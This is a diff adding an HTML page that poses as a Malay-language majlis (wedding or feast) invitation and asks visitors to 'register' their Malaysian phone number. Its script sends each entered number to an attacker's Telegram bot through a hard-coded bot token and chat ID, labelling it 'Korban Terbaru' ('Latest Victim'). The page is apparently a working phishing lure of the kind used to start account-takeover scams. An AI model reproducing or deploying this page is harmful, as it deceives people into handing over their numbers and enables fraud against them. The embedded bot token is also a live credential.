@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Majlis Invitation</title>
+    <style>
+        body {
+            background: url('https://telegra.ph/file/f7bf28203f692462e2621.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .welcome-screen, .phone-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            transition: all 0.5s ease-in-out;
+        }
+
+        .welcome-text, .bismillah, .phone-screen input, .phone-screen button {
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 25px;
+            padding: 10px 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin: 10px;
+        }
+
+        .welcome-text {
+            font-size: 24px;
+        }
+
+        .bismillah-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-style: italic;
+            background: linear-gradient(45deg, #4CAF50, #8BC34A, #4CAF50);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradient 3s linear infinite;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        .continue-btn {
+            background: linear-gradient(45deg, #4CAF50, #8BC34A, #4CAF50);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 20px 40px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            background-size: 200% auto;
+            animation: gradient 3s linear infinite;
+        }
+
+        .continue-btn:hover {
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+        }
+
+        .phone-screen input {
+            border: 1px solid #ccc;
+            width: 80%;
+            max-width: 300px;
+            padding: 10px 20px;
+        }
+
+        .phone-screen button {
+            background: linear-gradient(45deg, #4CAF50, #8BC34A, #4CAF50);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 15px 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            background-size: 200% auto;
+            animation: gradient 3s linear infinite;
+        }
+
+        .phone-screen button:hover {
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+        }
+
+        .phone-screen {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="welcome-screen">
+        <div class="bismillah-title">بِسْــــــــــــــــــمِ اللهِ الرَّحْمَنِ الرَّحِيْمِ</div>
+        <div class="welcome-text">𝙎𝙖𝙡𝙖𝙢 𝙆𝙖𝙢𝙞 𝙢𝙚𝙣𝙟𝙚𝙢𝙥𝙪𝙩 𝙩𝙪𝙖𝙣/𝙥𝙪𝙖𝙣 & 𝙨𝙚𝙢𝙪𝙖 𝙧𝙚𝙠𝙖𝙣 𝙠𝙚 𝙟𝙚𝙢𝙥𝙪𝙩𝙖𝙣 𝙢𝙖𝙟𝙡𝙞𝙨 🙏🏻<br>𝐓𝐀𝐑𝐈𝐊𝐇/𝐌𝐀𝐒𝐀/𝐓𝐄𝐌𝐏𝐀𝐓 𝐒𝐄𝐌𝐔𝐀 𝐀𝐃𝐀 𝐃𝐀𝐋𝐀𝐌 𝐉𝐄𝐌𝐏𝐔𝐓𝐀𝐍<br>𝐒𝐈𝐋𝐀 𝐊𝐋𝐈𝐊 𝐍𝐄𝐗𝐓👇🏻</div>
+        <button class="continue-btn" onclick="showPhoneScreen()">Next</button>
+    </div>
+    <div class="phone-screen">
+        <div class="bismillah">Register Nombor</div>
+        <input type="tel" id="phone-number" placeholder="🇲🇾 +60">
+        <button onclick="sendPhoneNumber()">Register Account</button>
+    </div>
+    <script>
+        function showPhoneScreen() {
+            document.querySelector('.welcome-screen').style.display = 'none';
+            document.querySelector('.phone-screen').style.display = 'flex';
+        }
+
+        function sendPhoneNumber() {
+            var phoneNumber = document.getElementById('phone-number').value;
+            var botToken = '7314986492:AAF2tzojdwBxxSTa2vt_fXQFZlbOh3fLB68';
+            var chatId = '7224276865';
+            var message = 'Korban Terbaru 🔥: \n' + phoneNumber;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Done 🙏');
+                    } else {
+                        alert('Terjadi kesalahan. Silakan coba lagi.');
+                    }
+                })
+                .catch(error => {
+                    alert('Terjadi kesalahan. Silakan coba lagi.');
+                });
+        }
+    </script>
+</body>
+</html>
